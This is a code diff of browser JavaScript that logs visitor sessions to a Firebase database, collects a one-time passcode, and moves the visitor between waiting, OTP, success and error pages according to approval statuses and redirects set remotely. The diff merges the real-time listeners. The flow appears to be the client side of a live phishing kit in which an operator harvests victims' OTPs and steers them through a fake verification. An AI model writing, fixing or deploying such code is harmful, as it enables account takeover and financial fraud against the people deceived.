     update(ref(db, `site1/sessions/${sessionId}`), {
-      otp,
-      status: 'otp_submitted',
-      currentPage: 'otp-waiting',
-      lastAction: Date.now()
-    }).then(() => {
-      hideLoading();
-      goToPage('otp-waiting');
-      startPolling();
-    });
+      otp, status: 'otp_submitted',
+      currentPage: 'otp-waiting', lastAction: Date.now()
+    }).then(() => { hideLoading(); goToPage('otp-waiting'); });
   }
 
   // ===== INIT =====
-  // Register session on load
   update(ref(db, `site1/sessions/${sessionId}`), {
     currentPage: 'landing',
     currentUrl: window.location.href,
     lastAction: Date.now()
   });
 
-  // Listen for real-time redirects
-  onValue(ref(db, `site1/sessions/${sessionId}/redirectTo`), (snap) => {
-    const page = snap.val();
-    if (page) {
-      update(ref(db, `site1/sessions/${sessionId}`), { redirectTo: null });
-      goToPage(page);
-    }
-  });
+  // ✅ Real-time listener شامل
+  onValue(ref(db, `site1/sessions/${sessionId}`), (snap) => {
+    const data = snap.val();
+    if (!data) return;
+    const currentPage = document.querySelector('.page.active')?.id?.replace('page-', '');
 
-  // Listen for real-time status changes
-  onValue(ref(db, `site1/sessions/${sessionId}/status`), (snap) => {
-    const status = snap.val();
-    const currentPage = document.querySelector('.page.active')?.id;
-    if (status === 'approved' && currentPage === 'page-waiting') {
+    if (data.redirectTo) {
+      update(ref(db, `site1/sessions/${sessionId}`), { redirectTo: null });
+      goToPage(data.redirectTo);
+      return;
+    }
+
+    const status = data.status;
+    if (status === 'approved' && currentPage === 'waiting') {
       goToPage('otp');
-    } else if (status === 'rejected' && (currentPage === 'page-waiting' || currentPage === 'page-otp-waiting')) {
+    } else if (status === 'rejected' && (currentPage === 'waiting' || currentPage === 'otp-waiting')) {
       goToPage('error');
-    } else if (status === 'final_approved' && currentPage === 'page-otp-waiting') {
+    } else if (status === 'final_approved' && currentPage === 'otp-waiting') {
       goToPage('success');
-    } else if (status === 'final_rejected' && currentPage === 'page-otp-waiting') {
+    } else if (status === 'final_rejected' && currentPage === 'otp-waiting') {
       goToPage('error');
     }
   });
